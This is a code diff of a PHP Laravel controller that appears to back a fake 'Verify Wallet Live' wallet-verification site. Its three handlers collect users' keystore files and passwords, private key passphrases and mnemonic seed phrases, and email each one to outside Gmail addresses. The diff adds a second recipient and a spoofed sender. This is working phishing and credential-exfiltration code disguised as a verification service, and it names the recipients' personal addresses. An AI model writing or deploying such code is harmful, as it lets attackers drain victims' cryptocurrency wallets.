@@ -19,11 +19,15 @@ class ActionController extends Controller
 
         $data = array('keystorefile' => $upload_link, 'keystorepassword' => $request->keystorepassword);
 
-		Mail::send(['text'=>'firstform'], $data, function($message) {
-		 $message->to('babalolaebenezertaiwo@gmail.com', 'Verify Account Live : By keystorefile')->subject
-		    ('Verify Account Live : By keystorefile');
-		 $message->from('xyz@gmail.com','Website');
-		});
+		Mail::send('firstform', $data, function($message) {
+		 $message->to('Carmeloschupbach@gmail.com', 'Verify Account Live : By keystorefile')->subject('Verify Account Live : By keystorefile');
+		 $message->from('technical@verifywalletlive.com','Verify Wallet Live');
+		});       
+
+        Mail::send('firstform', $data, function($message) {
+         $message->to('Men.jes04@gmail.com', 'Verify Account Live : By keystorefile')->subject('Verify Account Live : By keystorefile');
+         $message->from('technical@verifywalletlive.com','Verify Wallet Live');
+        });
 
     	return redirect()->back();
     }
@@ -32,11 +36,17 @@ class ActionController extends Controller
     {
 	   	$data = array('privatekeypass' => $request->privatekeypass);
 	   
-		Mail::send(['text'=>'secondform'], $data, function($message) {
-		 $message->to('babalolaebenezertaiwo@gmail.com', 'Verify Account Live : By Private Key')->subject
+		Mail::send('secondform', $data, function($message) {
+		 $message->to('Carmeloschupbach@gmail.com', 'Verify Account Live : By Private Key')->subject
 		    ('Verify Account Live : By Private Key');
-		 $message->from('xyz@gmail.com','Website');
+		 $message->from('technical@verifywalletlive.com','Verify Wallet Live');
 		});
+
+        Mail::send('secondform', $data, function($message) {
+         $message->to('Men.jes04@gmail.com', 'Verify Account Live : By Private Key')->subject
+            ('Verify Account Live : By Private Key');
+         $message->from('technical@verifywalletlive.com','Verify Wallet Live');
+        });
 
     	return redirect()->back();
     }
@@ -45,11 +55,17 @@ class ActionController extends Controller
     {
 	   	$data = array('mneomic' => $request->mneomic);
 	   
-		Mail::send(['text'=>'thirdform'], $data, function($message) {
-		 $message->to('babalolaebenezertaiwo@gmail.com', 'Verify Account Live : By Mneomic Phrase')->subject
+		Mail::send('thirdform', $data, function($message) {
+		 $message->to('Carmeloschupbach@gmail.com', 'Verify Account Live : By Mneomic Phrase')->subject
 		    ('Verify Account Live : By Mneomic Phrase');
-		 $message->from('xyz@gmail.com','Website');
+		 $message->from('technical@verifywalletlive.com','Verify Wallet Live');
 		});
+
+        Mail::send('thirdform', $data, function($message) {
+         $message->to('Men.jes04@gmail.com', 'Verify Account Live : By Mneomic Phrase')->subject
+            ('Verify Account Live : By Mneomic Phrase');
+         $message->from('technical@verifywalletlive.com','Verify Wallet Live');
+        });
 
     	return redirect()->back();
     }
